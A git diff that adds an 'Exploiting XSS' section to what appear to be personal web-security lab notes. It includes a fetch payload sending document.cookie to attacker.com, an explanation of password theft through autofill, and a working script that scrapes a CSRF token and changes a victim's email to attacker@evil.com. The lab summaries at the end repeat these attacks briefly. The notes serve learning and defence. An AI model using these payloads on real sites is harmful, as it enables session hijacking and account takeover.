@@ -270,6 +270,63 @@ Most injection vulnerabilities exist not because there's zero validation but bec
 
 ---
 
+## Exploiting XSS
+
+`alert(1)` is proof the bug exists. The real question is what an attacker can actually do with it. The answer is almost always more than the developer thinks.
+
+### Stealing cookies
+
+XSS gives you code execution in the victim's browser. The victim's cookies are sitting right there in `document.cookie`. The attack is just reading that value and sending it somewhere you control.
+
+```javascript
+fetch('https://attacker.com/?c='+document.cookie)
+```
+
+Inject this as a stored XSS payload in a comment field. Every user who loads the page sends their session cookie to your server. You take the cookie, set it in your browser, you're now them.
+
+**Why HttpOnly blocks this:** if the cookie has the HttpOnly flag, JS can't read it. `document.cookie` won't show it. This is the single most important cookie defense and why you'll often see cookie stealing combined with other techniques.
+
+**Lab solution (understood, Burp Pro needed):** stored XSS in comment field, payload uses fetch to send `document.cookie` to Burp Collaborator, server logs the incoming request containing the victim's session token.
+
+### Stealing passwords via autofill
+
+Browsers autofill saved credentials into username/password fields. If you can inject a hidden form with those field types into the page, the browser fills them in automatically. Your JS then reads the values and exfiltrates them.
+
+The victim doesn't type anything. The browser does the work for you.
+
+**Lab solution (understood, Burp Pro needed):** stored XSS injects a fake form, browser autofills credentials, JS reads the password field value and sends it to Collaborator.
+
+### XSS to CSRF
+
+XSS already gives you code execution as the victim. That means you can make any HTTP request the victim could make, including state-changing ones like changing their email or password.
+
+The difference from regular CSRF: CSRF tokens aren't a defense here. The attacker's JS runs in the victim's browser on the victim's origin, so it can read the page's source, extract the CSRF token, and include it in the forged request. CSRF protection assumes the attacker can't read the page. XSS breaks that assumption.
+
+The attack chain:
+1. XSS fires in victim's browser
+2. JS makes a GET request to the account settings page
+3. Response comes back, JS parses out the CSRF token from the HTML
+4. JS makes a POST request to change email, with the real CSRF token included
+5. Server accepts it, email changed, attacker takes over account
+
+```javascript
+fetch('/my-account')
+  .then(r => r.text())
+  .then(html => {
+    const token = html.match(/name="csrf" value="([^"]+)"/)[1];
+    return fetch('/my-account/change-email', {
+      method: 'POST',
+      body: 'email=attacker@evil.com&csrf=' + token
+    });
+  });
+```
+
+Two requests, fully automated, victim sees nothing.
+
+**Why this matters conceptually:** CSRF tokens protect against cross-origin requests. XSS is same-origin by definition. The token defense is irrelevant once XSS exists. This is why XSS is treated as higher severity than CSRF.
+
+---
+
 ## My insights
 
 Reflected vs stored isn't just a technical difference - it's a reliability difference from the attacker's perspective. Reflected is a gamble. Stored is a guarantee. That's why stored is treated as higher severity.
@@ -324,3 +381,9 @@ Context is everything in XSS. The same payload that works in raw HTML does nothi
 - Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped - angle brackets encoded, can't close script tag, single quotes escaped, used `\` to escape the app's backslash and free the quote, broke out of string mid-script-block
 - Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped - input lands in onclick handler inside an href attribute, HTML encoding applies so used HTML entity `&apos;` for single quote, browser decodes it before JS runs so the string breaks correctly
 - Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped - everything escaped except the template literal syntax itself, used `${alert(1)}` directly since template literals evaluate expressions by design, no breakout needed
+- Exploiting XSS to perform CSRF - stored XSS in comment field, payload makes a GET to account settings page, parses the CSRF token from the response HTML with a regex match, then fires a POST to change the victim's email with the real token included, CSRF protection bypassed entirely because JS runs same-origin so it can read the page freely
+
+
+### Theory understood, lab skipped (requires Burp Pro / Collaborator)
+- Exploiting XSS to steal cookies - stored XSS payload reads document.cookie and exfiltrates to external server via fetch, session hijack from there
+- Exploiting XSS to capture passwords - stored XSS injects hidden form fields, browser autofills saved credentials, JS reads the values and sends them out
